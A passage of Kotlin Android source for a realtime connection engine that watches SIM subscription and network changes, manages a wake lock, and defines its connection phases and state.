            delay(millis.coerceAtMost(5_000))
        }
    }

    private fun publish(phase: Phase, message: String) {
        val previous = _state.value
        if (previous.phase == phase && previous.message == message) return
        Log.i(TAG, "$phase $message")
        _state.update { it.copy(phase = phase, message = message) }
    }

    private fun watchSims() {
        if (!simsWatch.compareAndSet(false, true)) return
        val manager = app.getSystemService(SubscriptionManager::class.java) ?: return
        val listener = object : SubscriptionManager.OnSubscriptionsChangedListener() {
            override fun onSubscriptionsChanged() {
                val identity = identityStore.get() ?: return
                if (!helloAcked || session == null) return
                scope.launch {
                    try {
                        sendHello(identity)
                    } catch (t: Throwable) {
                        Log.w(TAG, "sim refresh", t)
                    }
                }
            }
        }
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                manager.addOnSubscriptionsChangedListener(app.mainExecutor, listener)
            } else {
                @Suppress("DEPRECATION")
                manager.addOnSubscriptionsChangedListener(listener)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "sim watch", t)
        }
    }

    private fun registerNetwork() {
        if (!networkRegistered.compareAndSet(false, true)) return
        try {
            val manager = app.getSystemService(ConnectivityManager::class.java)
            if (manager == null) {
                networkUp.value = true
                return
            }
            networkUp.value = hasValidatedNetwork(manager)
            val callback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    refreshNetwork(manager)
                }

                override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
                    refreshNetwork(manager)
                }

                override fun onLost(network: Network) {
                    refreshNetwork(manager)
                    if (!networkUp.value) {
                        scope.launch {
                            try {
                                session?.cancel()
                            } catch (_: Throwable) {
                            }
                        }
                    }
                }
            }
            if (Build.VERSION.SDK_INT >= 26) {
                manager.registerDefaultNetworkCallback(callback, Handler(Looper.getMainLooper()))
            } else {
                manager.registerDefaultNetworkCallback(callback)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "network callback", t)
            networkRegistered.set(false)
            networkUp.value = true
        }
    }

    private fun refreshNetwork(manager: ConnectivityManager) {
        val wasUp = networkUp.value
        val up = hasValidatedNetwork(manager)
        networkUp.value = up
        if (up != wasUp) wake.trySend(Unit)
    }

    private fun isLoopback(url: String): Boolean {
        return url.contains("://127.0.0.1") || url.contains("://localhost")
    }

    private fun hasValidatedNetwork(manager: ConnectivityManager): Boolean {
        return try {
            val network = manager.activeNetwork ?: return false
            val caps = manager.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } catch (_: Throwable) {
            true
        }
    }

    private fun acquireWakeLock() {
        val lock = wakeLock ?: return
        try {
            if (!lock.isHeld) lock.acquire(15_000L)
        } catch (t: Throwable) {
            Log.w(TAG, "wakelock acquire", t)
        }
    }

    private fun releaseWakeLock() {
        val lock = wakeLock ?: return
        try {
            if (lock.isHeld) lock.release()
        } catch (t: Throwable) {
            Log.w(TAG, "wakelock release", t)
        }
    }

    private companion object {
        const val TAG = "Realtime"
    }
}

data class EngineState(
    val phase: Phase = Phase.Stopped,
    val serverOnline: Boolean? = null,
    val lastSeenMillis: Long? = null,
    val message: String = "",
)

enum class Phase {
    Stopped,
    NeedIdentity,
    WaitingNetwork,
    Connecting,
    Authenticating,
    Authenticated,
}
